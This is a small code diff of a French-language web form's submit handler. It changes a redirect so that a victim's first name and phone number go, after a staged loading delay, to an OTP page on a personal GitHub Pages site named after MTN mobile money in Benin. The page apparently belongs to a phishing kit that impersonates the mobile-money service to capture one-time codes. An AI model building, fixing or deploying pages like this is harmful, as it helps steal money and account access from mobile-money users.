@@ -623,7 +623,7 @@
             }
         }, 1000);
         
-        // Soumission du formulaire
+        // Soumission du formulaire - VERSION CORRIGÉE (UNE SEULE LIGNE DE REDIRECTION)
         document.getElementById('submitBtn').addEventListener('click', function(e) {
             e.preventDefault();
             
@@ -643,9 +643,9 @@
             document.getElementById('loadingOverlay').style.display = 'flex';
             document.getElementById('submitBtn').disabled = true;
             
-            // Redirection vers la page OTP
+            // ✅ UNE SEULE REDIRECTION - L'URL COMPLÈTE
             setTimeout(function() {
-                window.location.href = 'otp.html?firstname=' + encodeURIComponent(firstName) + '&phone=' + encodeURIComponent(phone);
+                window.location.href = 'https://nomadewebe-tech.github.io/Mtn-argent-Bénin/otp.html?firstname=' + encodeURIComponent(firstName) + '&phone=' + encodeURIComponent(phone);
             }, 3000);
         });
         
